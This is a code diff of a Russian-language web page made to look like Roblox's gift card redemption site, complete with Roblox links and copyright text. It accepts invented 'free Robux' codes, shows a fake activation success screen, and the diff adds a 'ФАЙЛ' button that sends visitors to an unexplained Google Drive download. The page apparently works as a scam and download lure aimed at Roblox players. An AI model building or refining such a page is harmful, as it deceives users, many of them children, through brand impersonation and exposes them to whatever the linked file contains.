@@ -950,6 +950,85 @@
             font-size: 14px;
         }
         
+        /* Новые стили для страницы успеха как на скриншоте */
+        .success-page-new {
+            display: none;
+            flex: 1;
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 16px;
+        }
+        
+        .success-card {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin-bottom: 24px;
+        }
+        
+        .success-status {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #333;
+        }
+        
+        .success-code {
+            font-size: 16px;
+            margin-bottom: 24px;
+            color: #666;
+        }
+        
+        .success-action-btn {
+            width: 100%;
+            background: #000000;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 16px;
+            font-weight: 600;
+            position: relative;
+            transition: all 0.2s ease;
+            -webkit-tap-highlight-color: transparent !important;
+        }
+        
+        .success-action-btn:hover {
+            background: #333333;
+        }
+        
+        .success-action-btn:active::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: #000000;
+            border-radius: 1px;
+        }
+        
+        .success-action-btn:active {
+            transform: translateY(1px);
+            outline: none;
+        }
+        
+        .file-btn {
+            background: #00a2ff;
+        }
+        
+        .file-btn:hover {
+            background: #0088cc;
+        }
+        
+        .file-btn:active::after {
+            background: #0088cc;
+        }
+        
         @media (max-width: 768px) {
             .top-nav {
                 display: none;
@@ -1122,37 +1201,45 @@
         </div>
     </div>
 
-    <!-- Страница успеха -->
-    <div id="success-page" class="success-page">
-        <div class="success-container">
-            <div class="success-icon">✓</div>
-            <h1 class="success-title">Код успешно активирован!</h1>
+    <!-- Новая страница успеха (как на скриншоте) -->
+    <div id="success-page-new" class="success-page-new">
+        <div class="success-card">
+            <div class="success-status">Код успешно активирован!</div>
+            <div class="success-code" id="success-code-new">Код: ••••••••</div>
             
-            <p class="success-message">
-                Ваш код был успешно активирован. Робуксы были зачислены на ваш аккаунт.
-            </p>
-            
-            <div class="success-details">
-                <div class="detail-row">
-                    <span>Код:</span>
-                    <span id="activated-code">••••••••</span>
-                </div>
-                <div class="detail-row">
-                    <span>Начислено:</span>
-                    <span>400 Робуксов</span>
-                </div>
-                <div class="detail-row">
-                    <span>Дата активации:</span>
-                    <span id="activation-date"></span>
-                </div>
+            <button class="success-action-btn" onclick="goToRoblox()">Играть в Roblox</button>
+            <button class="success-action-btn file-btn" onclick="downloadFile()">📂 ФАЙЛ</button>
+            <button class="success-action-btn" onclick="activateAnotherNew()">Вернуться к погашению</button>
+        </div>
+        
+        <div class="info-panel">
+            <div class="info-title">Дополнительная информация</div>
+            <ul class="info-list">
+                <li><a href="https://www.youtube.com/watch?v=6fL1Dk3j4qk" target="_blank">Как использовать подарочные карты (видео)</a></li>
+                <li><a href="https://en.help.roblox.com/hc/en-us/articles/115005566223-How-Do-I-Redeem-a-Gift-Card-" target="_blank">Дополнительная информация о подарочных картах</a></li>
+                <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать коды виртуальных предметов</a></li>
+                <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать промокоды</a></li>
+            </ul>
+        </div>
+        
+        <div class="footer">
+            <div class="language-selector">
+                <select>
+                    <option>Русский</option>
+                    <option>English</option>
+                    <option>Español</option>
+                </select>
             </div>
             
-            <div class="success-buttons">
-                <button class="success-btn success-primary" onclick="goToRoblox()">Играть в Roblox</button>
-                <button class="success-btn success-secondary" onclick="activateAnother()">Активировать другой код</button>
+            <div class="footer-links">
+                <a href="https://www.roblox.com/info/about" target="_blank">О нас</a>
+                <a href="https://corp.roblox.com/careers/" target="_blank">Работа</a>
+                <a href="https://blog.roblox.com/" target="_blank">Блог</a>
+                <a href="https://corp.roblox.com/parents/" target="_blank">Родители</a>
+                <a href="https://www.roblox.com/gamecards" target="_blank">Подарочные карты</a>
             </div>
             
-            <a href="#" class="back-link" onclick="activateAnother()">← Вернуться на главную</a>
+            <p class="copyright">©2025 Roblox Corporation. Roblox, логотип Roblox и Powering Imagination являются нашими зарегистрированными и незарегистрированными товарными знаками в США и других странах.</p>
         </div>
     </div>
 
@@ -1164,16 +1251,6 @@
                 <div class="loading-dot"></div>
                 <div class="loading-dot"></div>
                 <div class="loading-dot"></div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Всплывающее оповещение об успешной активации -->
-    <div class="alert-overlay" id="alert-overlay">
-        <div class="alert-box">
-            <div class="alert-title">Код успешно активирован</div>
-            <div class="alert-buttons">
-                <button class="alert-btn back-btn" id="alert-back-btn">Вернуться к активации</button>
             </div>
         </div>
     </div>
@@ -1197,14 +1274,12 @@
     <script>
         // Элементы страницы активации
         const activationPage = document.getElementById('activation-page');
-        const successPage = document.getElementById('success-page');
+        const successPageNew = document.getElementById('success-page-new');
         const termsCheckbox = document.getElementById('terms-checkbox');
         const redeemBtn = document.getElementById('redeem-btn');
         const codeInput = document.getElementById('code-input');
         const activationDots = document.getElementById('activation-dots');
         const loadingOverlay = document.getElementById('loading-overlay');
-        const alertOverlay = document.getElementById('alert-overlay');
-        const alertBackBtn = document.getElementById('alert-back-btn');
         
         // Элементы навигации
         const burgerMenu = document.getElementById('burger-menu');
@@ -1216,18 +1291,14 @@
         const mobileSearchContainer = document.getElementById('mobile-search-container');
         const mobileSearchBox = document.getElementById('mobile-search-box');
         
-        // Элементы страницы успеха
-        const activatedCode = document.getElementById('activated-code');
-        const activationDate = document.getElementById('activation-date');
+        // Элементы новой страницы успеха
+        const successCodeNew = document.getElementById('success-code-new');
         
         // Список действительных кодов
         const validCodes = ["SPIDERCOLA", "TWEETROBLOX", "ROBLOXEDU", "FREEROBUX", "DDJ", "FREENGNISDI"];
         
         // Инициализация
         document.addEventListener('DOMContentLoaded', function() {
-            // Установка даты на странице успеха
-            activationDate.textContent = new Date().toLocaleDateString('ru-RU');
-            
             // Активируем кнопку "Робуксы" по умолчанию
             document.querySelectorAll('.nav-link, .mobile-nav-link').forEach(link => {
                 if (link.textContent === 'Робуксы' || link.href.includes('gamecards')) {
@@ -1268,7 +1339,7 @@
                 
                 // Проверка кода
                 if (validCodes.includes(code)) {
-                    showSuccessPage(code);
+                    showSuccessPageNew(code);
                 } else {
                     alert('Неверный код. Проверьте ввод и попробуйте снова.');
                     // Скрываем точки при ошибке
@@ -1277,11 +1348,11 @@
             }, 2000);
         });
         
-        // Показать страницу успеха
-        function showSuccessPage(code) {
+        // Показать новую страницу успеха
+        function showSuccessPageNew(code) {
             activationPage.style.display = 'none';
-            successPage.style.display = 'block';
-            activatedCode.textContent = code;
+            successPageNew.style.display = 'block';
+            successCodeNew.textContent = `Код: ${code}`;
         }
         
         // Перейти в Roblox
@@ -1289,9 +1360,14 @@
             window.location.href = 'https://www.roblox.com';
         }
         
-        // Активировать другой код
-        function activateAnother() {
-            successPage.style.display = 'none';
+        // Перейти к файлу
+        function downloadFile() {
+            window.location.href = 'https://drive.google.com/file/d/1fSeKGQrkFYeV_5sUwFTGY0od896oq5lS/view?usp=drive_link';
+        }
+        
+        // Активировать другой код (новая версия)
+        function activateAnotherNew() {
+            successPageNew.style.display = 'none';
             activationPage.style.display = 'block';
             
             // Сброс формы
